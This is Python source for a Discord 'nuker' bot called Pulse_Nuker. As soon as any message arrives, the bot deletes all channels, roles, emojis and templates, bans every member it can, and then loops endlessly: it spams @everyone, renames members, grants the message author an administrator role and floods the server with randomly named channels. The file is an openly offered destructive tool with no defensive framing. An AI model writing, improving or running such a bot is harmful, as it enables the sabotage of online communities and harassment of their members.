import os
import discord
import time
import random
import string
from discord.utils import get

def randomletters(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

TOKEN = ("")


client=discord.Client(intents=discord.Intents.all())


@client.event
async def on_ready():
    global TEST
    TEST = 0
    print("Pulse_Nuker v1.1 is running.\nInvite your bot and send any message to start nuke.\n\n")
    print("WARNING!!\nYou may get API Timeout from Discord server if you nuke long.\nPlease Use wisely.")
    return await client.change_presence(activity=discord.Game(name='Pulse_Nuker v1.1'))
    
    
'''
@client.event
async def on_member_ban(guild,user):
    await guild.unban(user)
    print("removed ban")
'''


@client.event
async def on_message(message):
    if TEST == 0:
        TEST = 1
        for c in message.guild.channels: 
                await c.delete()
        for user in message.guild.members:
            try:
                await user.ban()
            except:
                pass
        for role in message.guild.roles:  
            try:  
                await role.delete()
            except:
                pass
        for Emoji in message.guild.emojis:
            await Emoji.delete()
        for template in await message.guild.templates():
           await template.delete()
        await message.guild.create_text_channel(randomletters(99))
    
    response = '@everyone' #You can add some messages via editing this string
    
    while True:
        print("message sent "+random.choice(string.ascii_letters))
        try:
            await message.channel.send(response)
        except:
            print("message error")
            pass
        try:
            for user in message.guild.members:
                await user.edit(nick=randomletters(3))
        except:
            print("can't change user nick")
            pass
        guild=message.guild
        perms=discord.Permissions(administrator=True)
        try:
            user=message.author
            await guild.create_role(name='TEST', colour=discord.Colour(0x597E8D),permissions=perms)
            role=get(guild.roles,name='TEST')
            await user.add_roles(role)
        except:
            print('maximum number of roles reached')
            pass
        guild=message.guild
        
        await guild.create_text_channel(randomletters(99))
        await guild.create_text_channel(randomletters(99))
        await message.channel.delete()
        print("channel yeeted")
        user=message.author
        
@client.event
async def on_command_error(error):
    if isinstance(error, discord.HTTPException):
        time.sleep(10)

@client.event
async def on_guild_channel_create(channel):
    await channel.send("@everyone")

client.run(TOKEN)


#Made by Pulse.
